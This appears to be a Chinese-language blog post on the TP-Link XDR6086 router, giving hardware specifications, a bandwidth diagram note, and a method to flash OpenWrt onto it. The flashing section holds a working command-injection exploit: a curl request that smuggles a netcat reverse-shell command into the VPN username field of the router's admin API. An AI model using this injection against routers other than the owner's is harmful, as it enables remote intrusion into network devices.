---
title: TP-Link XDR6086的带宽分配
date: 2026-07-20 13:33:35
tags: 
  - 路由器
  - 拓扑图
index_img: 2026/diagram-tplink-xdr6086/diagram-tplink-xdr6086.png
---

# 基本信息

```yaml
CPU:
  型号: MT7986A (MediaTek Filogic 830)
  架构: 四核 ARM Cortex-A53
  主频: 2.0 GHz
内存: 512 MB DDR4
存储: 128 MB 
无线规格:
  2.4GHz频段:
    规格: Wi-Fi 6 4x4 MIMO
    最大频宽: 40 MHz
    理论最大速率: 1147 Mbps
    FEM芯片: 未知
  5GHz频段:
    规格: Wi-Fi 6 4x4 MIMO
    最大频宽: 160 MHz
    理论最大速率: 4804 Mbps
    FEM芯片: QPF4588 (Qorvo)
  总无线速率: AX6000
接口:
  以太网口:
    - 2.5 Gbps * 2
    - 1 Gbps * 1
  USB接口:
    速率: 5 Gbps
电源:
  输入: 12V / 4A
```

# 带宽图解

{% asset_img diagram-tplink-xdr6086.png%}

注：
* 整体架构与[XDR6088](/2026/diagram-tplink-xdr6088/)完全一致，值得注意的是交换芯片最多可以引出4个千兆口，但是XDR6086只使用了其中一个。

# 刷机

首先对于XDR6086，TP-Link官方没有提供类似XDR6088那样通过在官方系统中更新一个debug固件作为过渡，然后刷入OpenWRT系统的方法。这种情况下，除了拆开接ttl刷写这种比较麻烦的方式（不提XDR6086的外壳非常难拆），还有一种方式是利用系统漏洞获得一个shell刷写。

然后是似乎对于固件版本比较新的系统，[恩山这篇教程](https://www.right.com.cn/forum/thread-8307196-1-1.html)里的shell反弹指令似乎已经没有效果了。在固件版本号 ``1.0.8`` 上的机器上测试，只有[OpenWRT Wiki上提到的这个方法](https://openwrt.org/toh/tp-link/xdr-6088)还可以使用。

具体原理上的讲解和详细的步骤就跳过了，这里值得一提的是该方法安装 ``netcat`` 步骤完全可以跳过，直接参考恩山教程中的指令：

```bash
#先对应修改路由器&监听地址和鉴权stok
stok=xxx
command=mkfifo /tmp/p;sh -i</tmp/p 2>&1|nc 192.168.1.254 4444
curl -H "Content-Type: application/json" -X POST -d '{"vpn":{"table":"user","para":{"username":";$command","password":"password1","type":"l2tp","netmode":"client2lan","localip":"192.168.2.1","dns":"1.1.1.1","block":"0","ippool":"new","maxsessions":"1"},"name":"user_1"},"method":"add"}' http://192.168.1.1/stok=$stok/ds
```

也可以得到shell以供操作，虽然不完整但是``dd``和``tftp``指令都可以使用，足够完成备份和系统刷写。

# 参考链接

1. 拆解：[TP-LINK AX6000双频WiFi6 XDR6086易展Turbo版拆机](https://www.acwifi.net/21922.html)
2. MT7531的规格表：[MT7531 Datasheet - Gigabit Switch | MediaTek](https://datasheet4u.com/datasheets/MediaTek/MT7531/1603028)
3. 恩山的刷机教程：[小白亲刷 TP-LINK TL_XDR6088 /6086 刷入官方Openwrt/Immortalwrt 及刷回原厂教程完-OPENWRT专版-恩山无线论坛 -  Powered by Discuz!](https://www.right.com.cn/forum/thread-8307196-1-1.html)
4. OpenWRT的该型号的ToH页：[[OpenWrt Wiki] TP-Link XDR-6088](https://openwrt.org/toh/tp-link/xdr-6088)